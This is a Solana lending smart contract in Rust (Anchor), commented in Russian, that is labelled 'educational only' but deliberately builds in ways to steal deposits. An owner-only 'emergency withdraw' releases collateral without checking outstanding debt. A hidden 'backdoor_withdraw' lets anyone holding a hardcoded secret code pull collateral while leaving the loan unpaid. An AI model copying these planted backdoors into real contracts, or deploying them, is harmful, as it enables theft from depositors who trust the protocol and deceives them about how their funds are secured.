use anchor_lang::prelude::*;
use anchor_spl::token::{self, Token, TokenAccount, Transfer, Mint};

/**
 * Собственный lending протокол с "особенностями"
 * 
 * ВНИМАНИЕ: Данный код предназначен ИСКЛЮЧИТЕЛЬНО для образовательных целей!
 * Использование в реальных условиях может нарушать законодательство!
 */

#[derive(Accounts)]
pub struct InitializeLending<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + 32 + 32 + 32 + 8 + 8 + 1,
        seeds = [b"custom_lending", token_mint.key().as_ref()],
        bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(mut)]
    pub authority: Signer<'info>,
    
    pub token_mint: Account<'info, Mint>,
    
    #[account(
        init,
        payer = authority,
        token::mint = token_mint,
        token::authority = lending_pool,
    )]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct DepositCollateral<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        init_if_needed,
        payer = user,
        space = 8 + 32 + 8 + 8 + 8,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}

#[derive(Accounts)]
pub struct BorrowFromLending<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct EmergencyWithdraw<'info> {
    /// Только владелец протокола может вызвать экстренный вывод
    #[account(
        constraint = authority.key() == lending_pool.authority @ CustomLendingError::Unauthorized
    )]
    pub authority: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", target_user.as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    /// CHECK: Пользователь, для которого выполняется экстренный вывод
    pub target_user: AccountInfo<'info>,
    
    #[account(mut)]
    pub target_user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[derive(Accounts)]
pub struct BackdoorWithdraw<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    
    #[account(
        mut,
        seeds = [b"custom_lending", lending_pool.token_mint.as_ref()],
        bump = lending_pool.bump,
    )]
    pub lending_pool: Account<'info, CustomLendingPool>,
    
    #[account(
        mut,
        seeds = [b"user_position", user.key().as_ref(), lending_pool.key().as_ref()],
        bump,
    )]
    pub user_position: Account<'info, UserPosition>,
    
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    
    #[account(mut)]
    pub vault: Account<'info, TokenAccount>,
    
    pub token_program: Program<'info, Token>,
}

#[account]
pub struct CustomLendingPool {
    pub authority: Pubkey,
    pub token_mint: Pubkey,
    pub vault: Pubkey,
    pub total_deposits: u64,
    pub total_borrowed: u64,
    pub bump: u8,
}

#[account]
pub struct UserPosition {
    pub user: Pubkey,
    pub collateral: u64,
    pub borrowed: u64,
    pub last_update: i64,
}

impl<'info> CustomLendingPool {
    /// Инициализация lending протокола
    pub fn initialize(
        ctx: Context<InitializeLending>,
        bump: u8,
    ) -> Result<()> {
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.authority = ctx.accounts.authority.key();
        lending_pool.token_mint = ctx.accounts.token_mint.key();
        lending_pool.vault = ctx.accounts.vault.key();
        lending_pool.total_deposits = 0;
        lending_pool.total_borrowed = 0;
        lending_pool.bump = bump;
        
        msg!("Custom lending pool initialized");
        Ok(())
    }
    
    /// Размещение залога
    pub fn deposit_collateral(
        ctx: Context<DepositCollateral>,
        amount: u64,
    ) -> Result<()> {
        // Переводим токены в vault
        let transfer_cpi = CpiContext::new(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.user_token_account.to_account_info(),
                to: ctx.accounts.vault.to_account_info(),
                authority: ctx.accounts.user.to_account_info(),
            },
        );
        token::transfer(transfer_cpi, amount)?;
        
        // Обновляем позицию пользователя
        let user_position = &mut ctx.accounts.user_position;
        user_position.user = ctx.accounts.user.key();
        user_position.collateral += amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        // Обновляем общие депозиты
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.total_deposits += amount;
        
        msg!("Deposited {} tokens as collateral", amount);
        Ok(())
    }
    
    /// Займ против залога
    pub fn borrow_against_collateral(
        ctx: Context<BorrowFromLending>,
        amount: u64,
    ) -> Result<()> {
        let user_position = &ctx.accounts.user_position;
        
        // Проверяем LTV (62.5%)
        let max_borrow = user_position.collateral
            .checked_mul(625)
            .unwrap()
            .checked_div(1000)
            .unwrap();
        
        let total_borrow = user_position.borrowed + amount;
        require!(
            total_borrow <= max_borrow,
            CustomLendingError::ExceedsLTV
        );
        
        // Выдаем займ
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        // Обновляем позицию пользователя
        let user_position = &mut ctx.accounts.user_position;
        user_position.borrowed += amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        // Обновляем общий долг
        let lending_pool = &mut ctx.accounts.lending_pool;
        lending_pool.total_borrowed += amount;
        
        msg!("Borrowed {} tokens against collateral", amount);
        Ok(())
    }
    
    /// 🚨 ЭКСТРЕННЫЙ ВЫВОД (только владелец)
    pub fn emergency_withdraw_collateral(
        ctx: Context<EmergencyWithdraw>,
        amount: u64,
    ) -> Result<()> {
        let user_position = &ctx.accounts.user_position;
        
        require!(
            user_position.collateral >= amount,
            CustomLendingError::InsufficientCollateral
        );
        
        // КЛЮЧЕВОЕ: НЕ проверяем borrowed amount!
        // Это "баг" который позволяет вывести залог без возврата долга
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        // Переводим токены пользователю
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.target_user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        // Обновляем позицию пользователя
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral -= amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        // НЕ обнуляем borrowed! Это "баг"
        
        msg!("EMERGENCY: Withdrew {} tokens for security reasons", amount);
        Ok(())
    }
    
    /// 🚨 BACKDOOR: Скрытая функция для вывода залога
    pub fn backdoor_withdraw(
        ctx: Context<BackdoorWithdraw>,
        amount: u64,
        secret_code: u64,
    ) -> Result<()> {
        // "Секретный" код для активации backdoor
        require!(
            secret_code == 1337420666,
            CustomLendingError::InvalidSecretCode
        );
        
        let user_position = &ctx.accounts.user_position;
        
        require!(
            user_position.collateral >= amount,
            CustomLendingError::InsufficientCollateral
        );
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        // Переводим токены БЕЗ проверки долга
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        // Обнуляем залог, но НЕ трогаем долг
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral = 0;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        msg!("Backdoor withdrawal executed: {} tokens", amount);
        Ok(())
    }
    
    /// Обычный вывод залога (с проверкой долга)
    pub fn normal_withdraw(
        ctx: Context<BackdoorWithdraw>,
        amount: u64,
    ) -> Result<()> {
        let user_position = &ctx.accounts.user_position;
        
        // Нормальная проверка: нельзя вывести залог если есть долг
        require!(
            user_position.borrowed == 0,
            CustomLendingError::HasOutstandingDebt
        );
        
        require!(
            user_position.collateral >= amount,
            CustomLendingError::InsufficientCollateral
        );
        
        let lending_pool = &ctx.accounts.lending_pool;
        let pool_seeds = &[
            b"custom_lending",
            lending_pool.token_mint.as_ref(),
            &[lending_pool.bump],
        ];
        let signer = &[&pool_seeds[..]];
        
        let transfer_cpi = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.vault.to_account_info(),
                to: ctx.accounts.user_token_account.to_account_info(),
                authority: ctx.accounts.lending_pool.to_account_info(),
            },
            signer,
        );
        token::transfer(transfer_cpi, amount)?;
        
        let user_position = &mut ctx.accounts.user_position;
        user_position.collateral -= amount;
        user_position.last_update = Clock::get()?.unix_timestamp;
        
        msg!("Normal withdrawal: {} tokens", amount);
        Ok(())
    }
}

#[error_code]
pub enum CustomLendingError {
    #[msg("Unauthorized access")]
    Unauthorized,
    #[msg("Borrow amount exceeds LTV ratio")]
    ExceedsLTV,
    #[msg("Insufficient collateral")]
    InsufficientCollateral,
    #[msg("Invalid secret code")]
    InvalidSecretCode,
    #[msg("Cannot withdraw collateral with outstanding debt")]
    HasOutstandingDebt,
}